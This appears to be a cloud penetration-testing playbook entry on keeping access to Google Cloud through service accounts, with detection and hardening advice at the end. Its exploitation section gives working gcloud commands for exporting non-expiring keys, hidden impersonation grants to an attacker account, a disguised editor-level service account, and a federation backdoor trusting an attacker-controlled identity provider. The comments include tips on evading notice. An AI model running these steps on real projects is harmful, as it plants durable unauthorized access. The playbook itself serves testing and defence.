---
cstg_id: CSTG-GCP-SERVICE-ACCOUNTS-PERSIST
title: "GCP Service Accounts - Persistence"
provider: gcp
service: service-accounts
phase: persistence
required_access: assumed-breach
required_permissions:
  - iam.serviceAccounts.create
  - iam.serviceAccountKeys.create
  - iam.serviceAccounts.setIamPolicy
  - resourcemanager.projects.setIamPolicy
  - iam.workloadIdentityPools.create
  - iam.workloadIdentityPools.providers.create
  - iam.roles.update
tools:
  - gcloud CLI
  - Google Cloud IAM / IAM Credentials API
  - external OIDC provider (federation)
references:
  - "https://cloud.google.com/iam/docs/keys-create-delete"
  - "https://cloud.google.com/iam/docs/workload-identity-federation"
  - "https://cloud.google.com/iam/docs/service-account-permissions"
  - "https://cloud.google.com/iam/docs/manage-access-service-accounts"
  - "https://rhinosecuritylabs.com/cloud-security/privilege-escalation-google-cloud-platform-part-2/"
  - "https://hackingthe.cloud/gcp/"
license: CC BY-SA 4.0
---

## Summary

Persistence in GCP is the act of establishing durable access that survives credential rotation, session expiry, and remediation of the original entry point. Service accounts are the ideal persistence vehicle because they are non-human (no MFA, rarely reviewed), can hold standing keys, can be impersonated by hidden grants, and can be trusted by external identity providers. The objective of this phase is to plant one or more long-lived footholds — credentials, hidden impersonation rights, or federation trusts — so the tester retains access even after defenders rotate the breached user's password or revoke the initial token.

The principal persistence mechanisms are: (1) creating and exporting user-managed SA keys; (2) granting hidden impersonation rights (`serviceAccountTokenCreator`) buried in policy; (3) creating new attacker-controlled service accounts with high privilege; (4) establishing or repurposing Workload Identity Federation trust to an external IdP the tester controls; and (5) editing custom roles so privilege is restored automatically. Each leaves distinct audit evidence, covered below.

## Prerequisites

Assumed-breach with sufficient rights to perform at least one of: create SA keys (`iam.serviceAccountKeys.create`), edit SA or project IAM (`iam.serviceAccounts.setIamPolicy` / `resourcemanager.projects.setIamPolicy`), create service accounts (`iam.serviceAccounts.create`), configure federation (`iam.workloadIdentityPools.create`), or update a custom role (`iam.roles.update`). These are typically obtained after the [Privilege Escalation](../03-privilege-escalation/gcp-service-accounts-privesc.md) phase.

## Enumeration

Before planting persistence, confirm what is achievable and survey what already exists (to blend in):

```bash
# Existing keys - a new one is less conspicuous on an SA that already has several
gcloud iam service-accounts keys list --iam-account=TARGET_SA --managed-by=user

# Existing federation pools to reuse/extend rather than create new (quieter)
gcloud iam workload-identity-pools list --location=global

# Existing custom roles the tester can modify
gcloud iam roles list --project=PROJECT --format="table(name,title)"

# Confirm rights to set policy
curl -s -X POST -H "Authorization: Bearer $(gcloud auth print-access-token)" \
  -H "Content-Type: application/json" \
  "https://cloudresourcemanager.googleapis.com/v1/projects/PROJECT:testIamPermissions" \
  -d '{"permissions":["iam.serviceAccounts.create","iam.serviceAccountKeys.create","resourcemanager.projects.setIamPolicy"]}'
```

## Misconfigurations & Findings

- **Service account key creation enabled** (org policy `iam.disableServiceAccountKeyCreation` not enforced), allowing exportable, non-expiring credentials.
- **No alerting on new key creation or IAM grants**, so persistence artifacts go unnoticed.
- **Over-broad `setIamPolicy` rights** that let a principal grant itself or a hidden SA standing access.
- **Workload Identity Federation creation permitted** without review, enabling external trust to attacker-controlled IdPs.
- **Editable custom roles** whose permission sets are not change-controlled.
- **Orphaned/unused service accounts** that a tester can repurpose or leave behind unnoticed.

## Exploitation

### Long-lived service account key

The simplest durable foothold: a JSON key that authenticates indefinitely, independent of the original session.

```bash
gcloud iam service-accounts keys create /tmp/persist.json \
  --iam-account=TARGET_SA
# Reactivate any time, from anywhere:
gcloud auth activate-service-account --key-file=/tmp/persist.json
```

Keys created without expiry remain valid until explicitly deleted. Creating a key on an SA that already has several user-managed keys reduces conspicuousness.

### Hidden impersonation grant

Rather than holding a key (which can be listed and revoked), grant a controlled principal the right to mint tokens for a privileged SA on demand. This can be placed on the SA resource or at the project level and is easy to overlook in a large policy.

```bash
# On the SA resource
gcloud iam service-accounts add-iam-policy-binding TARGET_SA \
  --member="user:attacker@example.com" \
  --role="roles/iam.serviceAccountTokenCreator"

# Or grant impersonation broadly at project level (blends into many bindings)
gcloud projects add-iam-policy-binding PROJECT \
  --member="serviceAccount:attacker-controlled@PROJECT.iam.gserviceaccount.com" \
  --role="roles/iam.serviceAccountTokenCreator"

# Reuse any time:
gcloud auth print-access-token --impersonate-service-account=TARGET_SA
```

### Create a new attacker-controlled service account

Provision a fresh SA, grant it privilege, and create a key — a self-contained foothold decoupled from any existing identity.

```bash
gcloud iam service-accounts create svc-monitor \
  --display-name="monitoring agent"     # benign-looking name
gcloud projects add-iam-policy-binding PROJECT \
  --member="serviceAccount:svc-monitor@PROJECT.iam.gserviceaccount.com" \
  --role="roles/editor"
gcloud iam service-accounts keys create /tmp/svc.json \
  --iam-account=svc-monitor@PROJECT.iam.gserviceaccount.com
```

### Workload Identity Federation backdoor

Establish trust between a privileged SA and an external OIDC/SAML IdP the tester controls. No GCP key is stored; the tester mints credentials from outside GCP at will, surviving key audits.

```bash
gcloud iam workload-identity-pools create persist-pool --location=global
gcloud iam workload-identity-pools providers create-oidc persist-prov \
  --location=global --workload-identity-pool=persist-pool \
  --issuer-uri="https://attacker-idp.example" \
  --attribute-mapping="google.subject=assertion.sub"
gcloud iam service-accounts add-iam-policy-binding TARGET_SA \
  --role="roles/iam.workloadIdentityUser" \
  --member="principalSet://iam.googleapis.com/projects/PROJECTNUM/locations/global/workloadIdentityPools/persist-pool/*"
```

### Custom-role permission injection

If a custom role is bound to a controlled principal, add powerful permissions to the role itself so access is restored automatically and is harder to spot than a new binding.

```bash
gcloud iam roles update CUSTOM_ROLE --project=PROJECT \
  --add-permissions=iam.serviceAccounts.getAccessToken,resourcemanager.projects.setIamPolicy
```

## Detection & Logging

- **Cloud Audit Logs — Admin Activity** (always on) record the core persistence actions: `google.iam.admin.v1.CreateServiceAccount`, `CreateServiceAccountKey`, `SetIamPolicy` (project and SA), `UpdateRole`, `CreateWorkloadIdentityPool`, and `CreateWorkloadIdentityPoolProvider`. Each shows the acting principal, target, and granted role/member.
- High-value alerts: any new `CreateServiceAccountKey`, especially on privileged or default SAs; new `serviceAccountTokenCreator` / `workloadIdentityUser` bindings; creation of new service accounts with subsequent privileged grants; any new Workload Identity pool/provider; permission additions to custom roles.
- **Data Access logs** for `iamcredentials.googleapis.com` later reveal the persistence being *used* (`GenerateAccessToken` from the hidden grant) and federated token exchanges.
- Correlate creation events with the originating IP/principal — persistence is often planted from the same anomalous session as the escalation.
- Security Command Center surfaces exportable keys, primitive roles on SAs, and external federation trust as posture findings; Event Threat Detection flags anomalous key creation and grants.

## Remediation & Hardening

- Enforce `iam.disableServiceAccountKeyCreation` and `iam.disableServiceAccountKeyUpload` org policies to eliminate the key-based foothold; prefer short-lived credentials.
- Alert in near-real-time on `CreateServiceAccountKey`, `CreateServiceAccount`, `SetIamPolicy` adding impersonation/owner/editor, `UpdateRole`, and any Workload Identity pool/provider creation.
- Restrict `iam.serviceAccounts.setIamPolicy`, `resourcemanager.projects.setIamPolicy`, `iam.serviceAccounts.create`, and `iam.workloadIdentityPools.*` to a small, audited admin set.
- Constrain Workload Identity Federation with tight attribute conditions and allow only known issuer URIs; review all pools/providers regularly.
- Inventory and rotate/expire user-managed keys; remove unused service accounts; apply change control and review to custom-role definitions.
- Use IAM deny policies and Conditions to block impersonation and policy-edit outside approved contexts, and periodically reconcile IAM policy against a known-good baseline to surface injected bindings.

## Tools

- **gcloud CLI** — `iam service-accounts create/keys create`, `add-iam-policy-binding`, `workload-identity-pools`, `iam roles update`.
- **Google Cloud IAM / IAM Credentials API** — key and identity creation, federated token exchange.
- **External OIDC/SAML provider** — federation backdoor trust anchor.

## References

- Create and manage service account keys — https://cloud.google.com/iam/docs/keys-create-delete
- Manage access to service accounts — https://cloud.google.com/iam/docs/manage-access-service-accounts
- Service account permissions — https://cloud.google.com/iam/docs/service-account-permissions
- Workload Identity Federation — https://cloud.google.com/iam/docs/workload-identity-federation
- GCP privilege escalation / persistence, part 2 (Rhino Security Labs) — https://rhinosecuritylabs.com/cloud-security/privilege-escalation-google-cloud-platform-part-2/
- GCP techniques (hackingthe.cloud) — https://hackingthe.cloud/gcp/
